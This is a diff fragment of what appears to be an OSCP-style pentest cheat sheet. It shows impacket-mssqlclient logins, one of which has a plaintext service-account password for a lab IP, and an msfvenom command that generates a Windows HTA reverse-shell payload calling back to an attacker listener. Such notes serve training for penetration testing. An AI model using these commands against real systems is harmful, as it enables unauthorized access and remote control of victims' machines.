@@ -13,7 +13,7 @@
 <hr>
 <h2 class="code-line" data-line-start="14" data-line-end="15"><a id="Connect_to_a_SQL_database_14"></a>Connect to a SQL database:</h2>
 <p class="has-line-data" data-line-start="15" data-line-end="17"><code>impacket-mssqlclient 'username:password@ip'</code> <strong>&lt;&lt; 1 way</strong><br>
-<code>impacket-mssqlclient oscp.exam/sql_svc:<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="eaae85869a828384dbaadbdac4dbdac4dbd8dac4dbded2">[email&#160;protected]</a> -windows-auth</code> <strong>&lt;&lt; 2nd way</strong></p>
+<code>impacket-mssqlclient oscp.exam/sql_svc:Dolphin1@10.10.120.148 -windows-auth</code> <strong>&lt;&lt; 2nd way</strong></p>
 <hr>
 <h2 class="code-line" data-line-start="19" data-line-end="20"><a id="To_create_a_shell_using_msfvenom_to_get_a_reverse_shell_from_windows_hta_shell_19"></a>To create a shell using msfvenom to get a reverse shell from windows .hta shell</h2>
 <p class="has-line-data" data-line-start="20" data-line-end="21"><code>msfvenom -p windows/x64/shell_reverse_tcp lhost=192.168.45.183 lport=1331 -f hta-psh &gt; shell.hta</code></p>
